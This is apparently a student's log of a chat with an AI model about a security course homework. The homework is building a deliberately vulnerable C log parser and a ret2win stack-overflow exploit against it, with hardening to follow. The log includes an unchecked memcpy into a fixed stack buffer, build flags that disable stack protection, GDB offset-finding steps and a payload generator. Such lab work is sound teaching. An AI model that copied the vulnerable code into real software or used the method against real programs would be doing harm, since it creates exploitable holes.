# CSCE 465 — HW3 Task 1 AI Conversation Log

**Model:** OpenAI GPT-6  
**Dates:** October 24–26, 2026  
**Context:** Homework 3, Task 1 — Vulnerable Log Parser and Ret2win

## Exchange 1 — Task 1 Breakdown and Task 3 Dependencies

### User
Create a breakdown on task 1. Walk through all steps needed to complete it. What deliverables are needed so work on task 3 may begin?

### Assistant
Task 1 (40 points) requires implementing an intentionally vulnerable C log parser, determining the stack overflow offset using GDB, redirecting execution to a non-inlined win() function, and documenting the attack.

Task 3 (30 points) uses the Task 1 source code to implement a bounds check, enable compiler and linker hardening, and test that the original payload is rejected.

The tasks can proceed independently once Task 1 supplies the source code and a working exploit. Task 2, the OpenClaw prompt-injection experiment, is not a prerequisite for Task 3.

#### Step 1: Prepare the environment

Use the existing course VM and work from ~/csce465-agentsec/hw3.

```bash
sudo apt update
sudo apt install -y build-essential gdb binutils checksec apparmor-utils
gcc --version
gdb --version
checksec --version
aa-status --version
mkdir -p src tests markers inbox
```

#### Step 2: Set up the protected decoy

```bash
sudo mkdir -p /opt/agentsec
printf 'FAKE-COURSE-SECRET\n' | sudo tee /opt/agentsec/decoy.txt
sudo chmod 600 /opt/agentsec/decoy.txt
```

The fake protected file is intentionally restricted. win() must attempt to read the file and report success or failure. Successful exploitation does not necessarily mean successful access to the decoy.

#### Step 3: Implement legacy_log_parser.c

The parser requires:
- main(): accept one file path.
- parse_log(): read up to 512 bytes into heap memory, close the file, and call vulnerable_copy().
- vulnerable_copy(): copy the supplied bytes into a fixed 128-byte stack buffer without checking the destination capacity.
- win(): create markers/ret2win.txt and attempt to read /opt/agentsec/decoy.txt.

The required constants are:

```c
#define BUF_SIZE 128
#define MAX_COPY 512
```

An illustrative vulnerable function:

```c
__attribute__((noinline))
static void vulnerable_copy(const unsigned char *input, size_t n) {
    char buf[BUF_SIZE];
    memcpy(buf, input, n);
    // Print beginning of log.
}
```

The unchecked memcpy() is the vulnerability.

parse_log() should close the input file before calling vulnerable_copy(), avoiding corruption of an active FILE handle.

#### Step 4: Compile the vulnerable parser

```bash
gcc -O0 -g -fno-stack-protector -no-pie \
  -Wl,-z,noexecstack \
  -Wall -Wextra \
  -o legacy_log_parser src/legacy_log_parser.c

checksec --file=./legacy_log_parser
```

The compilation options disable stack canaries and PIE while retaining a non-executable stack. -O0 and -g simplify debugging.

Preserve the original checksec output for Task 3.

#### Step 5: Find the saved return-address offset using GDB

The exact saved return-address offset depends on the compiler's stack layout and must be determined empirically.

```bash
gdb -q ./legacy_log_parser
```

Example GDB commands:

```gdb
break vulnerable_copy
run tests/short.log
p/x &buf
info frame
p/x $rbp + 8
p/d (long)($rbp + 8) - (long)&buf
p/x win
```

For a conventional x86-64 frame-pointer layout, the saved return address is at $rbp + 8.

Alternatively:

```bash
nm ./legacy_log_parser | grep ' win$'
```

Record the measured offset and win() address.

#### Step 6: Generate the exploit payload

The payload consists of padding bytes up to the saved return address, followed by the address of win().

Example Python structure:

```python
from pathlib import Path
import struct

offset = 0      # Replace with measured offset
win_addr = 0    # Replace with actual address

payload = b"A" * offset
payload += struct.pack("<Q", win_addr)

Path("tests/ret2win_payload.bin").write_bytes(payload)
```

The address is packed as a little-endian 64-bit value for the expected x86-64 environment. Replace placeholders with measured values.

#### Step 7: Demonstrate the exploit

```bash
rm -f markers/ret2win.txt
python3 src/make_payload.py
./legacy_log_parser tests/ret2win_payload.bin
ls -l markers/ret2win.txt
cat markers/ret2win.txt
```

The marker demonstrates that win() executed. The decoy read may still be blocked by Unix permissions. A crash after executing win() is also possible because the stack is corrupted.

Save output or screenshots of the successful execution.

#### Step 8: Document Task 1

The Task 1 report needs:
1. GDB output showing the offset and win() address, plus evidence of direct execution.
2. A stack diagram showing the buffer, saved frame data, saved return address, measured offset, and replacement return target.
3. An explanation of the buffer overflow and control-flow redirection.

#### Task 3 Handoff

Task 3 needs:
- src/legacy_log_parser.c
- src/make_payload.py
- tests/ret2win_payload.bin
- Original vulnerable executable
- Original compilation command
- Original checksec output
- Recorded offset and win() address for reproducing the original attack

Task 3 does not require Task 2 to finish, nor does it require the Task 1 report section to be completed before programming begins.

Task 3 then creates legacy_log_parser_fixed.c, adds a bounds check, enables stack canaries, FORTIFY, PIE, Full RELRO, and compiler warning enforcement, and tests short input, exactly 128 bytes, 129 bytes, missing file, and the original exploit payload.

The original program and exploit should remain reproducible for comparison.

---

## Exchange 2 — Where to Print the Log

### User
Task 1 mentions the parser should normally print the beginning of the log. Where should this print occur? In parse log or after the vulnerable copy

### Assistant
I'd put the print inside vulnerable_copy(), immediately after the memcpy() call, before the function returns.

The assignment doesn't explicitly specify which function must print the log, but this makes the most sense for demonstrating the vulnerability.

```c
static void vulnerable_copy(const unsigned char *input, size_t n) {
    char buf[BUF_SIZE];

    // Intentionally vulnerable copy
    memcpy(buf, input, n);

    // Print the beginning of the log (up to 32 bytes)
    size_t print_len = n < 32 ? n : 32;
    printf("Log: %.*s\n", (int)print_len, buf);
}
```

### Why here?

Execution flow:

```text
main()
  └── parse_log()
        ├── Open file
        ├── Read into heap buffer
        ├── Close file
        └── vulnerable_copy()
              ├── Allocate 128-byte stack buffer
              ├── memcpy() ← Stack overflow occurs here
              ├── Print beginning of log
              └── return ← Saved return address may be overwritten
```

The return-address hijack occurs when vulnerable_copy() returns, not during the memcpy() operation.

For normal input, the function prints the log and returns to parse_log().

For malicious input, the function may print the beginning of the log, but when it returns, execution is redirected to win() rather than back to parse_log().

### Why use %.*s?

The buffer is not necessarily null-terminated.

Using:

```c
printf("%s", buf);
```

could cause an additional out-of-bounds read.

Using %.*s limits the number of characters printed, independently of the intentional overflow.

Recommendation: Keep parse_log() responsible for file handling and vulnerable_copy() responsible for copying and printing.
